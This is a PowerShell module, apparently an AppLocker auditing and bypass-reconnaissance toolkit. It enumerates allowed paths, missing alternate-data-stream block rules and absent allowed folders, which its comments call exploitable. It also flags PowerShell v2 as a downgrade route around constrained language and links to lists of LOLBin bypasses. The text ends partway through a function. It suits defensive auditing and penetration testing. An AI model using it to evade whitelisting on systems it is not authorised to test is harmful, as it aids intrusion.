Function Expand-PALPath
{
<#
.SYNOPSIS

Converts path that contains AppLocker specific variables into to normal paths.

Author: @oddvarmoe
License: BSD 3-Clause
Required Dependencies: None
Optional Dependencies: None

.DESCRIPTION
Takes path as input and normalizes it by changing AppLocker specific parameters into paths.
If variable that is sent into the function resolves to two paths (ex: System32/SysWOW64) the function will return both.
It also resolves paths containing ADS rules such as "%windir%\folder:*".

.EXAMPLE

PS C:\> Expand-PALPath -Path "%windir%\temp"

C:\Windows\temp

.EXAMPLE

PS C:\> Expand-PALPath -Path "%programfiles%"

C:\Program Files
C:\Program Files (x86)

.EXAMPLE

PS C:\> Expand-PALPath -Path "*"

C:

.EXAMPLE

PS C:\> Expand-PALPath -Path "%windir%\tasks:*"

C:\Windows\tasks:*
#>

# Function Version: 1.00

[CmdletBinding()] Param (
        [Parameter(ValueFromPipeline)]
		[string[]]
        $Path

    )
    Process
    {
        Try
        {
            $ReturnPaths = @()

            foreach($P in $Path)
            {
                $Temp = $null
                $TempX64 = $null

                if($P -eq "*")
                {
                    $Temp = $P -replace "\*",$env:SystemDrive
                }
                elseif($P -match "%PROGRAMFILES%")
                {
                        $Temp = $P -replace "%PROGRAMFILES%",$env:ProgramFiles
                        $TempX64 = $P -replace "%PROGRAMFILES%",${env:ProgramFiles(x86)}
                    }
                elseif($P -match "%windir%")
                {
                    $Temp = $P -replace "%windir%",$env:windir
                }
                elseif($P -match "%system32%")
                {
                    $Temp = $P -replace "%SYSTEM32%","c:\windows\system32"    
                    $TempX64 = $P -replace "%SYSTEM32%","c:\windows\syswow64"    
                }
                elseif($P -match "%OSDRIVE%")
                {
                    $Temp = $P -replace "%OSDRIVE%",$env:SystemDrive
                }
                else
                {
                    $Temp = ($P)
                }
                
                if($Temp -match ":\*")
                {
                }
                else
                {
                    $Temp = $Temp.TrimEnd("*")
                }
                
                $ReturnPaths += $Temp
                if($TempX64)
                {
                    if($TempX64 -match ":\*")
                    {
                    }
                    else
                    {
                        $TempX64 = $TempX64.TrimEnd("*")
                    }
                    $ReturnPaths += $TempX64
                }
                
                
            }
            return $ReturnPaths
        }
        Catch
        {
            write-error $_
        }
        Finally{}
    }
}

function Invoke-PALKnownBypasses
{
# NOT DONE!
	[CmdletBinding()] Param ()
    Process 
    {
		Write-error "THIS FUNCTION IS UNDER DEVELOPMENT - SCRIPT JUST A PLACEHOLDER - NOT DONE - stopping"
        break
        "`n`n[*] Checking PowerShell version 2 status"
		if(Get-PALPoshV2Installed -ErrorAction SilentlyContinue)
		{
		    "[+] PowerShell version 2 is active"
		    "[+] Exploit with: Powershell -version 2"
		}


		# RETRIVE APPLOCKER BYPASSES FROM MY GITHUB
		# VERIFY THAT BINARY FILE IS NOT IN PATH OR DENYED DIRECTLY
		#https://gist.githubusercontent.com/api0cradle/2ee73118f7a897b6cc127b1d33384acc/raw/1e9b988448536004df296d3aea9f206f2f9d047c/VerifiedAppLockerBypasses.csv
		#InstallUtil.exe,https://raw.githubusercontent.com/api0cradle/UltimateAppLockerByPassList/Dev/yml/installutil.exe.yml
		#Msbuild.exe,https://raw.githubusercontent.com/api0cradle/UltimateAppLockerByPassList/Dev/yml/installutil.exe.yml
		#Mshta.exe,https://raw.githubusercontent.com/api0cradle/UltimateAppLockerByPassList/Dev/yml/mshta.exe.yml
		#Regasm.exe,https://raw.githubusercontent.com/api0cradle/UltimateAppLockerByPassList/Dev/yml/regasm.exe.yml
		#Regsvcs.exe,https://raw.githubusercontent.com/api0cradle/UltimateAppLockerByPassList/Dev/yml/regsvcs.exe.yml

		#InstallUtil
		$InstallUtilPathsx86 = @("C:\Windows\Microsoft.NET\Framework\v2.0.50727","C:\Windows\Microsoft.NET\Framework\v4.0.30319")
		$InstallUtilPathsx64 = @("C:\Windows\Microsoft.NET\Framework64\v2.0.50727","C:\Windows\Microsoft.NET\Framework64\v4.0.30319")
		$testpath = "C:\Windows\Microsoft.NET\Framework\v2.0.50727","C:\Windows\Microsoft.NET\Framework\v4.0.30319\installutil.exe"

		#Check if Powershell 2 is removed or not
    }
}


function Get-PALMissingADSRules
{
<#
.SYNOPSIS
Lists out missing ADS blocking rules for userwriteable allowed paths

Author: @oddvarmoe
License: BSD 3-Clause
Required Dependencies: Get-PALRules, Get-PALWriteablePaths
Optional Dependencies: None

.DESCRIPTION

Lists out missing ADS blocking rules for userwriteable allowed paths

.PARAMETER RuleSection

What sort of section you want the rules for. Default is "All
Can be "All","Dll","Exe","Script","Appx","Msi". This Parameter is passed to the Get-PALRules.

.PARAMETER SID

The SID you want to get the rules for. 
Default is S-1-1-0. (Admin rules will not show up default as a consequence of that.)
If you want all you can supply *
List of well-known SIDs can be found here: https://support.microsoft.com/en-au/help/243330/well-known-security-identifiers-in-windows-operating-systems 

.EXAMPLE

#>

# Function Version: 0.95

    [CmdletBinding()] Param (
        [ValidateSet("All","Appx","Dll","Exe","Msi","Script")]
        [String]
        $RuleSection = "All",
                
        [String]
        #S-1-1-0 = Everyone
        $SID = "S-1-1-0"
        
    )
    Process
    {
        Try
        {

            $AllPaths = "C:\"
            if(!($WriteablePaths))
            {
                    Get-PALWriteablepaths -Path $AllPaths -ErrorAction SilentlyContinue
            }
            
            $DenyPathRules = Get-PALRules -OutputRules Path -RuleActions Allow -RuleSection $RuleSection -SID $SID -ExceptionsAsDeny

            
            $ADSCompareArray1 = @()
            $ADSCompareArray2 = @()
            
            $PathRuleReturnStatus += $path | select-object @{Name = 'Name'; Expression = {$AllowRule.ParentName}}, @{Name = 'Action'; Expression = {"Deny"}}
            
            foreach($Section in $DenyPathRules)
            {
                foreach($CompRule in $Section.RulesList)
                {
                    if($CompRule.RulePath -match "\\\*$" -and $CompRule.RulePath -notmatch "^\\\\")
                    {
                        if($($CompRule.path).count -gt 1)
                        {
                            foreach($Path in $CompRule.path)
                            {
                                $ADSCompareArray1 += $Path | Select-Object @{Name = 'Name'; Expression = {$CompRule.ParentName}}, @{Name = 'Path'; Expression = {$Path -Replace "\\$",":*"}}, @{Name = 'RealPath'; Expression = {$Path -replace "\\$",""}}
                            }
                        }
                        else
                        {
                            $ADSCompareArray1 += $CompRule | Select-Object @{Name = 'Name'; Expression = {$CompRule.ParentName}}, @{Name = 'Path'; Expression = {$CompRule.path -Replace "\\$",":*"}}, @{Name = 'RealPath'; Expression = {$CompRule.Path -replace "\\$",""}}
                        }
                    }

                    if($CompRule.RulePath -match ":\*$")
                    {
                        if($($CompRule.path).count -gt 1)
                        {
                            foreach($Path in $CompRule.path)
                            {
                                $ADSCompareArray2 += $Path | Select-Object @{Name = 'Name'; Expression = {$CompRule.ParentName}}, @{Name = 'Path'; Expression = {$Path -Replace "\\$",":*"}}
                            }
                        }
                        else
                        {
                            $ADSCompareArray2 += $CompRule | Select-Object @{Name = 'Name'; Expression = {$CompRule.ParentName}}, @{Name = 'Path'; Expression = {$CompRule.path}}
                        }
                    }
                }
            }

            $TempArray = $ADSCompareArray1 | Where-Object {$_.path -notin $ADSCompareArray2.path}
                       
            $Out = $TempArray | Where-Object {$_.RealPath -in $writeablepaths}
            return $Out | Sort-Object -Property path,name -Unique | Sort-Object -Property name | select Name,Path
        }
        Catch
        {
            write-error $_
        }
        Finally{}
    }
}


function Get-PALMissingAllowedPaths
{
<#
.SYNOPSIS

Lists paths that are missing on the filesystem that is allowed for execution. 

Author: @oddvarmoe
License: BSD 3-Clause
Required Dependencies: Get-PALWriteablePaths, Get-PALRules
Optional Dependencies: None

.DESCRIPTION

Retrieves the path from all the allowed AppLocker path rules and checks if the path is missing or not.  
It will list out the paths it cannot find and these paths can likely be exploited if the user can create the folders. 
Currently it does not resolve * in paths so it may contain false positives. 
Outputs: Name,Path

.PARAMETER RuleSection
What sort of section you want the rules for. Default is "All
Can be "All","Dll","Exe","Script","Appx","Msi". This Parameter is passed to the Get-PALRules.


.EXAMPLE

PS C:\> Get-PALMissingAllowedPaths

Name   Path                                                                                                                      
----   ----                                                                                                                      
Exe    C:\WINPROG\FARMS\FARM.EXE                                                                                                   
Exe    C:\USERS\*\APPDATA\LOCAL\CITRIX\SELFSERVICE\PROGRAM FILES\SELFSERVICEPLUGIN.EXE                                           
Exe    C:\HOMEMADE\CORE.EXE                                                                                                         
Script C:\HOMEMADE\START.BAT

#>

# Function Version: 0.80

    [CmdletBinding()] Param (
        [ValidateSet("All","Appx","Dll","Exe","Msi","Script")]
        [String]
        $RuleSection = "All"
        
    )
    Process
    {
        Try
        {
            $PathArray = @()
            $FinaleArray = @()
            
            $AllAppLockerRules = Get-PALRules -OutputRules Path -RuleActions Allow -RuleSection $RuleSection
            
            #Loop through each section DLL,EXE++
            foreach($SectionRules in $AllAppLockerRules)
            {
                # Fresh empty array for each section
                $MissingPathsArray = @()
                
                #Loop through each rule in the section
                foreach($Rule in $SectionRules.RulesList)
                {
                    # Expand the AppLocker path variables into real paths
                    $Paths = Expand-PALPath -Path $Rule.RulePath
                    foreach($Path in $Paths)
                    {
                        
                        if($Path -match "\.\w{2,4}$")
                        #File
                        {
                            if($path -match "^C:\\") #Only check local paths
                            {
                                if(Test-Path -path (Join-Path -Path (($path -split "\\")[0]) -ChildPath (($path -split "\\")[1])))
                                {
                                    
                                    if(test-path -Path $path -ErrorAction SilentlyContinue)
                                    {
                                        #all good, nothing todo here
                                    }
                                    else
                                    {
                                        #File not found, exploitable
                                        Write-Verbose "File not found, can be exploited"
                                        $MissingPathsArray += $path
                                    }

                                }
                                else
                                {
                                    write-verbose "Missing parent folder to $path - Exploit it"
                                    $MissingPathsArray += $path
                                }
                            }
                        }
                        else
                        #Folder
                        {
                            #Check if folder exists...assume it can be created if it does not exist under C:\
                            if($path -match "^C:\\") #Only check local paths
                            {
                                if(!(Test-Path -path (Join-Path -Path (($path -split "\\")[0]) -ChildPath (($path -split "\\")[1]))))
                                {
                                    write-verbose "Allow path rule is pointing to a missing parent folder: $path"
                                    $MissingPathsArray += $Path 
                                }
                            }
                        }
                    }
                }                

                foreach($MissingPath in $MissingPathsArray)
                {
                        $RuObject = New-Object PSObject
                        $RuObject | Add-Member NoteProperty Name $SectionRules.Name
                        $RuObject | Add-Member NoteProperty Path $MissingPath
                        $PathArray += $RuObject
                }
            
            }

            # Remove deny rules from the PathArray array
            $DenyRules = Get-PALRules -OutputRules Path -RuleActions Deny -RuleSection $RuleSection
            
            # Check if Deny rules are present
            if($DenyRules)
            {
                foreach($PathObj in $PathArray)
                {
                    $Add = $true
                    # See if Path we are checking has the correct section (DLL,Script). -1 eq not.
                    if(!($DenyRules.Name.IndexOf($($PathObj.Name))) -eq "-1")
                    {
                        foreach($DRP in $DenyRules[($DenyRules.Name.IndexOf($($PathObj.Name)))].ruleslist.path)
                        {
                            $diff = $($PathObj.path)
                            if($(Join-Path -Path $($DRP.ToLower()) -ChildPath $null) -like "$(Join-Path -Path $($diff.ToLower()) -childpath $null)*")
                            {
                                #Dont add, because it is a deny rule
                                $Add = $false
                            }
                        }
                    }
                    
                    if($Add)
                    {
                        $FinaleArray += $PathObj
                    }
                }
                return $FinaleArray
            }
            else
            {
                #No deny rules - return patharray instead
                if($PathArray)
                {
                    return $PathArray
                }
                else
                {
                    Write-Verbose "No paths found - returning null"
                    return $null
                }
            }
        }
        Catch
        {
            write-error $_
        }
        Finally{}
    }
}


function Get-PALPathStatus
{
<#
.SYNOPSIS

Checks given path/file if it is allowed or denied by the AppLocker rules.
When a folder path is checked it will return allow if the folder path is allowed in either EXE,DLL,MSI,SCRIPT,APPX.
When a file path is checked it will only check the correct section. EX: file.exe is only checked against EXE path rules and will only return deny or allow.
The function does not handle exceptions yet.

Author: @oddvarmoe
License: BSD 3-Clause
Required Dependencies: Get-PALRules,Get-PALRulesNative
Optional Dependencies: None

.DESCRIPTION

Gets all the AppLocker path rules and enumerates if the supplied path or file is allowed or denied. 
Returns Allow or Deny.

.PARAMETER Path

The Path you want to verify. Can either be a path to a folder or file. 
Parameter is mandatory.
	
.PARAMETER SID

The SID you want to get the rules for. 
Default is S-1-1-0. (Admin rules will not show up default as a consequence of that.)
If you want all you can supply *
List of well-known SIDs can be found here: https://support.microsoft.com/en-au/help/243330/well-known-security-identifiers-in-windows-operating-systems 

.PARAMETER OfflineXML

Path to OfflineXML that you have exported. 
This makes the function parse that file instead of the current AppLocker policy on the machine this script is running on.

.EXAMPLE
Tests status of cmd.exe. This is allowed in this example.

PS C:\> Get-PALPathStatus -Path "C:\windows\system32\cmd.exe"

Allow

.EXAMPLE
Tests if c:\blockedpath is blocked or not by the rules. The path is a blocked path in this example.

PS C:\> Get-PALPathStatus -Path c:\windows\tracing\

Name   Action
----   ------
Exe    Deny  
Msi    Deny  
Script Allow

.EXAMPLE
Test if c:\temp2\evil.exe is allowed or not, tested against an offline XML file.

PS C:\> Get-PALPathStatus -Path "c:\temp2\evil.exe" -OfflineXML "C:\folder\Export.xml"

Allow

.EXAMPLE
Test if c:\block is allowed for administrators.

PS C:\> Get-PALPathStatus -Path "C:\block" -SID "S-1-5-32-544"

Deny

#>    

# Function Version: 0.95

    [CmdletBinding()] Param (
        [Parameter(Mandatory=$true)]
        [String]
        $Path,

        [String]
        #S-1-1-0 = Everyone
        $SID = "S-1-1-0",

        [String]
        $OfflineXML
    )
    Process
    {
        Try
        {
            #Check if path or file
            #Uses simple check if supplied string ends with ".{2-4chars}"
            if($path -match "\.\w{2,4}$" -and $path -notmatch "\.\d{2,4}$")
            {
                Write-Verbose "Specified file"
                $Type = "File"
                
                #Find type of file relevant to AppLocker
                $Executable = @(".exe",".com")
                $WinInstaller = @(".msi",".mst",".msp")
                $Script = @(".ps1",".bat",".cmd",".vbs",".js") #More types?
                $DLL = @(".dll",".ocx")
                $Package = @(".appx")
                
                $FileExtension = ".$($path.Split(".")[1])"

                if($Executable -contains $FileExtension.ToLower())
                {
                    $FileType = "Exe"
                }
                elseif($WinInstaller -contains $FileExtension.ToLower())
                {
                    $FileType = "Msi"
                }
                elseif($Script -contains $FileExtension.ToLower())
                {
                    $FileType = "Script"
                }
                elseif($Dll -contains $FileExtension.ToLower())
                {
                    $FileType = "Dll"
                }
                elseif($Package -contains $FileExtension.ToLower())
                {
                    $FileType = "Appx"
                }
                else
                {
                    Write-error "Unknown file format specified - quitting"
                    break
                }
            }
            else
            {
                Write-Verbose "Specified folder"
                $Type = "Folder"
                if(!($path.Substring(($path.Length-1)) -eq "\"))
                {
                    $path = Join-Path $Path -ChildPath ""
                }
            }

            if($OfflineXML)
            {
                Write-Verbose "Parsing rules from XML"
                $PathRules = Get-PALRulesNative -OutputRules Path -RuleActions All -OfflineXML $OfflineXML -SID $sid
            }
            else
            {
                $DenyRules = Get-PALRules -OutputRules Path -RuleActions Deny -SID $SID -ExceptionsAsDeny
            }

            ## File check
            if($Type -eq "File")
            {
                #First check if path is allowed, then check if it is denied
                $AllowRules = Get-PALRules -OutputRules Path -RuleActions Allow -RuleSection $FileType -SID $SID
                #$Allowed = $null
                foreach($AllowRule in $AllowRules.RulesList)
                {
                    if($path -like "*$($AllowRule.Path)*")
                    {
                        $Allowed = $true
                        break
                    }
                }

                # Path is allowed, now check all deny rules and exceptions if it is denied
                if($Allowed)
                {
                    foreach($DenyRule in $($DenyRules | where-object{$_.name -eq $FileType}).RulesList)
                    {
                        if($path -like "*$($DenyRule.path)*")
                        {
                            return "Deny"
                            break
                        }
                    }
                    # Not explicit denied - Returing allowed
                    return "Allow"
                }
                else
                {
                    return "Deny"
                }
            }

            ## Folder check
            if($Type -eq "Folder")
            {
                $PathRuleReturnStatus = @()
                $AllowRules = Get-PALRules -OutputRules Path -RuleActions Allow -RuleSection All -SID $SID
                foreach($Section in $AllowRules)
                {
                    $Denied = $false
                    $Allowed = $false

                    foreach($AllowRule in $Section.RulesList)
                    {

                        # Dont process file paths
                        if(!($($AllowRule.path) -match "\.\w{2,4}$"))
                        {
                            if($Path -like "*$($AllowRule.Path)*")
                            {
                                $Allowed = $true
                            }
                        }
                    }
                
                    if($Allowed)
                    {
                        foreach($DenyRule in $($DenyRules | where-object{$_.name -eq $($Section.Name)}).RulesList)
                        {
                            if($path -like "*$($DenyRule.path)*")
                            {
                                $PathRuleReturnStatus += $path | select-object @{Name = 'Name'; Expression = {$AllowRule.ParentName}}, @{Name = 'Action'; Expression = {"Deny"}}
                                $Denied = $true
                                break
                            }
                        }
                        # Not explicit denied - Returning allowed
                        if(!($Denied))
                        {
                            $PathRuleReturnStatus += $path | select-object @{Name = 'Name'; Expression = {$AllowRule.ParentName}}, @{Name = 'Action'; Expression = {"Allow"}}
                        }
                    }
                    else
                    {
                        $PathRuleReturnStatus += $path | select-object @{Name = 'Name'; Expression = {$AllowRule.ParentName}}, @{Name = 'Action'; Expression = {"Deny"}}
                        $Denied = $true
                    }
                }
                return $PathRuleReturnStatus
            }
        }
        Catch
        {
            Write-error $_
        }
        Finally{}
    }
}

function Get-PALPoshV2Installed
{
<#
.SYNOPSIS

Checks if PowerShell version 2 and .NET Framework 2 is installed or not. Use verbose for details.

Author: @oddvarmoe
License: BSD 3-Clause
Required Dependencies: None
Optional Dependencies: None

.DESCRIPTION

Checks registry for key that indicates that PowerShell version 2 is still installed on system. 
If it is present, Powershell can be started with -version 2 to bypass constrained language.

.EXAMPLE

PS C:\> Get-PALPoshV2Installed

True

#>  

# Function Version: 1.00

    [CmdletBinding()] Param ()
    Process
    {
        try
        {
            if((Get-ItemProperty -Path "HKLM:\SOFTWARE\Microsoft\NET Framework Setup\NDP\v2.0.50727" -ErrorAction SilentlyContinue).install)
            {
                Write-Verbose ".NET Framework 2 present"
                if((Get-ItemProperty -Path "HKLM:\SOFTWARE\Microsoft\PowerShell\1" -ErrorAction SilentlyContinue).install -eq 1)
                {
                    Write-Verbose "Posh v2 present"
                    return $true
                }
                else
                {
                    Write-Verbose "Posh v2 missing"
                    return $false
                }    
            }
            else
            {
                Write-Verbose ".NET Framework 2 missing"
                return $false
            }   
        }
        catch
        {
            write-error $_
        }
        finally{}
    }
}


function Get-PALPublisherStatus
{
<#
.SYNOPSIS

Checks given path/file if it is denied by the current defined AppLocker Publisher rules. 

Author: @oddvarmoe
License: BSD 3-Clause
Required Dependencies: Get-PALRules, Get-AppLockerFileInformation
Optional Dependencies: None

.DESCRIPTION

Gets all the Denied AppLocker rules and enumerates if the supplied path or file are blocked or not. 
Returns true if blocked or false if not blocked.

.PARAMETER Path

The Path you want to verify. Can either be a path to a folder or file. 
Parameter is mandatory.

.PARAMETER SID

The SID you want to check the publisher rules against. 
Default is S-1-1-0 (Everyone). (Admin rules will not show up default as a consequence of that.)
If you want all you can supply *
List of well-known SIDs can be found here: https://support.microsoft.com/en-au/help/243330/well-known-security-identifiers-in-windows-operating-systems 

.PARAMETER SignPublisher

Used to specify the Publisher name.

.PARAMETER SignProductName

Used to specify the Product name

.PARAMETER SignFileName

Used to specify the File name

.PARAMETER SignVersion

Used to specify the version

.PARAMETER ExtractSignInfo

Switch used to extract all signature information from the file specified in the path.

.PARAMETER OfflineXML

Used to specify the path to the Offline XML of the AppLocker rules. 


.EXAMPLE

PS C:\> Get-PALPublisherStatus -Path C:\folder\autoruns.exe -Verbose
VERBOSE: Accessing Binary file to extract signature information
VERBOSE: Publisher: O=MICROSOFT CORPORATION, L=REDMOND, S=WASHINGTON, C=US
VERBOSE: Productname: SYSINTERNALS AUTORUNS
VERBOSE: FileName: AUTORUNS.EXE
VERBOSE: Version: 13.82.0.0
VERBOSE: * rule used in Appx - All signed is allowed
VERBOSE: * rule used in Msi - All signed is allowed
Deny	

.EXAMPLE

PS C:\> Get-PALPublisherStatus -SignPublisher "O=MICROSOFT CORPORATION, L=REDMOND, S=WASHINGTON, C=US" -Sign
ProductName "SYSINTERNALS AUTORUNS" -SignFileName "Autoruns.exe" -SignVersion "13.82.0.0"
Deny

#>    
# Function Version: 0.70
    [CmdletBinding()] Param (
        [parameter(Mandatory=$true,ParameterSetName="AutoSignInfo")]
        [String]
        $Path,
        
        [parameter(Mandatory=$true,ParameterSetName="ManualSignInfo")]
        [String]
        $SignPublisher,

        [parameter(Mandatory=$true,ParameterSetName="ManualSignInfo")]
        [String]
        $SignProductName,

        [parameter(Mandatory=$true,ParameterSetName="ManualSignInfo")]
        [String]
        $SignFileName,

        [parameter(Mandatory=$true,ParameterSetName="ManualSignInfo")]
        [String]
        $SignVersion,
        
        [String]
        #S-1-1-0 = Everyone
        $SID = "S-1-1-0",

        [String]
        $OfflineXML
    )
    Process
    {
        Try
        {
            If($Path)
            {
                Write-Verbose "Accessing Binary file to extract signature information"
                $SignInfo = Get-AppLockerFileInformation -Path $Path -ErrorAction Stop
                $SignPublisher = $SignInfo.Publisher.PublisherName
                $SignProductName = $SignInfo.Publisher.ProductName
                $SignFileName = $SignInfo.Publisher.BinaryName
                $SignVersion = $SignInfo.Publisher.BinaryVersion
                Write-Verbose "Publisher: $SignPublisher"
                Write-Verbose "Productname: $SignProductName"
                Write-Verbose "FileName: $SignFileName"
                Write-Verbose "Version: $SignVersion"
            }

            if($OfflineXML)
            {
                $PublisherRules = Get-PALRulesNative -OutputRules Publisher -RuleActions All -OfflineXML $OfflineXML
            }
            else
            {
                $PublisherRules = Get-PALRules -OutputRules Publisher -RuleActions All
            }

            #Find type of file relevant to AppLocker
            $Executable = @(".exe",".com")
            $WinInstaller = @(".msi",".mst",".msp")
            $Script = @(".ps1",".bat",".cmd",".vbs",".js") #More types?
            $DLL = @(".dll",".ocx")
            $Package = @(".appx")
            
            #$FileExtension = [System.IO.Path]::GetExtension($SignFileName)
            $FileExtension = ".$($SignFileName.Split(".")[1])"

            if($Executable -contains $FileExtension.ToLower())
            {
                $FileType = "Exe"
            
            }
            
            if($WinInstaller -contains $FileExtension.ToLower())
            {
                $FileType = "Msi"
            }
            
            if($Script -contains $FileExtension.ToLower())
            {
                $FileType = "Script"
            }
            
            if($Dll -contains $FileExtension.ToLower())
            {
                $FileType = "Dll"
            }
            
            if($Package -contains $FileExtension.ToLower())
            {
                $FileType = "Appx"
            }

            $Status = ""

            if($PublisherRules)
            {
                $Publishers = @()
                $Exceptions = @()

                foreach($Pr in $PublisherRules)
                {
                    $Parent = $Pr.Name        

                    foreach($P in $Pr.RulesList)
                    {
                        if($SID -eq $P.sid)
                        {
                            #Create custom object to store data in
                            $TempPublisherObject = New-Object psobject
                            
                            if($P.PublisherExceptions)
                            {
                                $TempExceptionObject = New-Object psobject
                                $TempExceptionObject | Add-Member NoteProperty Type "Publisher"
                                $TempExceptionObject | Add-Member NoteProperty PublisherName $P.PublisherExceptions.PublisherName 
                                $TempExceptionObject | Add-Member NoteProperty ProductName $P.PublisherExceptions.ProductName
                                $TempExceptionObject | Add-Member NoteProperty FileName $P.PublisherExceptions.BinaryName
                                $Exceptions += $TempExceptionObject
                            }

                            ##if($P.PathExceptions) {
                            ##    $TempExceptionObject = New-Object psobject
                            ##    $TempExceptionObject | Add-Member NoteProperty Type "Path"
                            ##    $TempExceptionObject | Add-Member NoteProperty Path $P.PathExceptions.Path 
                            ##    $Exceptions += $TempExceptionObject
                            ##}
                            ##
                            ##if($P.HashExceptions) {
                            ##    $TempExceptionObject = New-Object psobject
                            ##    $TempExceptionObject | Add-Member NoteProperty Type "Hash"
                            ##    $TempExceptionObject | Add-Member NoteProperty FileName $P.HashExceptions.SourceFileName 
                            ##    $TempExceptionObject | Add-Member NoteProperty FileLength $P.HashExceptions.SourceFileLength
                            ##    $TempExceptionObject | Add-Member NoteProperty Hash $P.HashExceptions.Data
                            ##    $Exceptions += $TempExceptionObject
                            ##}


                            if($P.PublisherName -eq $SignPublisher -or $P.ProductName -eq $SignProductName -or $P.BinaryName -eq $SignFileName)
                            {
                                Write-Verbose "Specific defined Signature rule for this binary"
                                $TempPublisherObject | Add-Member NoteProperty Name $Parent
                                $TempPublisherObject | Add-Member NoteProperty Publisher $SignPublisher
                                $TempPublisherObject | Add-Member NoteProperty ProductName $SignProductName
                                $TempPublisherObject | Add-Member NoteProperty FileName $SignFileName
                                $TempPublisherObject | Add-Member NoteProperty Action $P.Action
                                $Publishers += $TempPublisherObject
                            }
                            # Wildcard rules...
                            if($P.PublisherName -eq "*")
                            {
                                Write-Verbose "* rule used in $Parent - All signed is allowed"
                                $TempPublisherObject | Add-Member NoteProperty Name $Parent
                                $TempPublisherObject | Add-Member NoteProperty Publisher $P.PublisherName
                                $TempPublisherObject | Add-Member NoteProperty ProductName $P.Productname
                                $TempPublisherObject | Add-Member NoteProperty FileName $P.Filename
                                $TempPublisherObject | Add-Member NoteProperty Action $P.Action
                                $Publishers += $TempPublisherObject
                            }
                        }
                    }            
                }
            }

            foreach($pubr in $Publishers)
            {
                #Only check relevant rules compared to filetype
                #Exe rules for exe files.
                if($pubr.name -eq $FileType)
                {
                    if($pubr.action -eq "Allow")
                    {
                        $Status = "Allow"    
                    }
                    if($pubr.action -eq "Deny")
                    {
                        #Explicit deny - return Deny and exit
                        Write-Verbose $pubr
                        return "Deny"
                    }
                }
            }

            #Check exceptions
            foreach($exc in $Exceptions)
            {
                if($exc.PublisherName -eq $SignPublisher -or $exc.ProductName -eq $SignProductName -or $exc.BinaryName -eq $SignFileName)
                {
                    #Explicit deny
                    Write-Verbose "Denied by exception"
                    write-verbose $exc
                    return "Deny"
                }
            }
            if($Status)
            {
                return $Status
            }
            else
            {
                return "Deny"
            }
        }
        Catch
        {
            Write-Error $_
        }
        Finally{}
    }
}


function Get-PALRules
{
<#
.SYNOPSIS

The function Get-PALRules returns the AppLocker rules as an object that is current on the local machine from the registry.
AppLocker rules are written to registry.
 

Author: @oddvarmoe
License: BSD 3-Clause
Required Dependencies: Expand-PALPaths
Optional Dependencies: None

.DESCRIPTION

Will check against local registry under HKLM:\SOFTWARE\Policies\Microsoft\Windows\SrpV2\ to find the AppLocker rules. 
Rules are stored as XML in the registry, the function converts it to an object before it returns it. The function also supports to export the rules to an xml 
that can be extracted and viewed offline

.PARAMETER OutputRules

The type of rules you want to get. Default is "All".
Can be "All","Path","Publisher","Hash"

.PARAMETER RuleActions

What sort of rules you want. Default is "All"
Can be "All","Allow","Deny"

.PARAMETER RuleSection

What sort of section you want the rules for. Default is "All
Can be "All","Dll","Exe","Script","Appx","Msi"

.PARAMETER SID

The SID you want to get the rules for. 
Default is S-1-1-0. (Admin rules will not show up default as a consequence of that.)
If you want all you can supply *
List of well-known SIDs can be found here: https://support.microsoft.com/en-au/help/243330/well-known-security-identifiers-in-windows-operating-systems 

.PARAMETER XML

Switch. Returns output in XML format instead of Powershell objects. This makes it possible to export the data.
Note that it is not supported to specify Outputrules, RuleActions, RuleSection or SID when using this option.
The function exports all rules from the registry.

.PARAMETER OfflineXML

Path to OfflineXML that you have exported. 
This makes the function parse that file instead of the current AppLocker policy on the machine this script is running on. 
This function is currently now developed so it is adviced to use the Get-PALRulesNative instead for now.

.EXAMPLE
Gets all the AppLocker rules

PS C:\> Get-PALRulesStatus

Name RulesList                                                                                                                       
---- ---------                                                                                                                       
Appx {@{Ruletype=FilePublisherRule; Action=Allow; SID=S-1-1-0; Description=Allows members of the Everyone group to run packaged ap...
Exe  {@{Ruletype=FilePathRule; Action=Deny; SID=S-1-1-0; Description=; Name=%OSDRIVE%\inetpub; Id=16d974b5-279a-49a3-92c3-42b91050...
Msi  {@{Ruletype=FilePathRule; Action=Allow; SID=S-1-1-0; Description=Allows members of the Everyone group to run all Windows Inst...

.EXAMPLE
	
Gets all path rules that are defined with the deny Action

PS C:\> Get-PALRules -OutputRules Path -RuleActions Deny

Name RulesList                                                                                                                       
---- ---------                                                                                                                       
Exe  {@{Ruletype=FilePathRule; Action=Deny; SID=S-1-1-0; Description=; Name=%OSDRIVE%\inetpub; Id=16d974b5-279a-49a3-92c3-42b91050...

.EXAMPLE

Gets all the denied path rules and shows only the paths

PS C:\> (Get-PALRules -OutputRules Path -RuleActions Deny).RulesList.Path
%OSDRIVE%\inetpub\*
%WINDIR%\Microsoft.NET\*

.EXAMPLE

Gets all the publisher rules

PS C:\> Get-PALRules -OutputRules Publisher

Name RulesList                                                                                                                       
---- ---------                                                                                                                       
Appx {@{Ruletype=FilePublisherRule; Action=Allow; SID=S-1-1-0; Description=Allows members of the Everyone group to run packaged ap...
Exe  {@{Ruletype=FilePublisherRule; Action=Deny; SID=S-1-1-0; Description=; Name=CIPHER.EXE, in MICROSOFT® WINDOWS® OPERATING SYST...
Msi  {@{Ruletype=FilePublisherRule; Action=Allow; SID=S-1-1-0; Description=Allows members of the Everyone group to run digitally s...

.EXAMPLE

Exports the rules to an XML file

PS C:\> (Get-PALRules -XML).Save("c:\folder\Export.xml")

.EXAMPLE

Gets only allowed script rules.

PS C:\> Get-PALRules -OutputRules All -RuleActions Deny -RuleSection Script

Name   RulesList                                                                                                                                                                                                      
----   ---------                                                                                                                                                                                                      
Script {@{ParentName=Script; Ruletype=FilePathRule; Action=Deny; SID=S-1-1-0; Description=; Name=%WINDIR%\SysWOW64\Tasks\evil.exe; Id=88548f1b-4850-45d5-a551-2ab549fb0372; Path=C:\Windows\SysWOW64\Tasks\evil.exe...

#>

# Function Version: 0.95

    [CmdletBinding()] Param (
        [ValidateSet("All","Path","Publisher","Hash")]
        [String]
        $OutputRules = "All",
        
        [ValidateSet("All","Allow","Deny")]
        [String]
        $RuleActions = "All",

        [ValidateSet("All","Appx","Dll","Exe","Msi","Script")]
        [String]
        $RuleSection = "All",

        [String]
        #S-1-1-0 = Everyone - Default
        #* = ALL Sids
        $SID = "S-1-1-0",

        [Switch]
        $ExceptionsAsDeny,

        [Switch]
        $XML,

        [String]
        $OfflineXML
    )
    Process
    {
        Try
        {
            $RuleTypes = @("Appx","Dll","Exe","Msi","Script")

            If($OfflineXML)
            {
                write-error "OfflineXML not implemented yet. Still possible with Get-PALRulesNative -OfflineXML"
                break
            }

